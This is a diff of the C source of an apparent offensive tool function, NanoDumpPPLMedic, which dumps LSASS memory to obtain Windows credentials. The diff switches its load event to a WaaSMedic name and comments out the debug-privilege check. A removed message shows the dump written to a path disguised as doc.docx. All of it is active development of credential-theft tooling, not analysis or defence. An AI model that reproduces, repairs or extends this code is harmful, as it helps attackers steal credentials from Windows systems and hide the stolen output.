@@ -1336,16 +1336,15 @@ BOOL NanoDumpPPLMedic(VOID)
 
     //remove_syscall_callback_hook();
 
-    success = signal_dll_load_event(STR_IPC_WERFAULT_LOAD_EVENT_NAME);
-    if (!success)
-        goto cleanup;
+    signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
 
     if (!full_dump_path.Length)
         goto cleanup;
 
-    success = enable_debug_priv();
-    if (!success)
-        goto cleanup;
+    // not sure why this fails
+    //success = enable_debug_priv();
+    //if (!success)
+    //    goto cleanup;
     
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
@@ -1357,12 +1356,6 @@ BOOL NanoDumpPPLMedic(VOID)
     else
     {
         DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
-    }
-
-    if (!full_dump_path.Length)
-    {
-        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
-        goto cleanup;
     }
 
     if (!create_file(&full_dump_path))
